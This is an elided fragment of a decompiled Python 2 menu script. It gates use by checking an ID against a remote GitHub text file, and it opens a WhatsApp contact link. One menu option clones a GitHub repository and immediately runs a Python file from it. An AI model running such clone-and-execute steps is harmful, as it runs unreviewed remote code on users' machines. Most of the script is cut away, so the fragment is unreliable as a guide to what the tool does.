...
# Time Succes decompile : 2022-04-03 01:54:54.375903
try:
...
def mohammad():
    ...
    try:
        httpCaht = requests.get('https://raw.githubusercontent.com/love-sohail/public/main/Wazeer.txt').text
        if id in httpCaht:
...
def method_menu_select():
    ...
    if afza == '1':
        ...
        os.system('cd $HOME && git clone https://github.com/love-sohail/public')
        os.system('mv $HOME/.... $HOME/public')
        os.system('python2 Public.py')
        os.system('clear')
        print logo
...
if __name__ == '__main__':
    ...
    time.sleep(2)
    print ' '
    os.system('xdg-open https://wa.me/923130997378')
    time.sleep(10)
    ip()
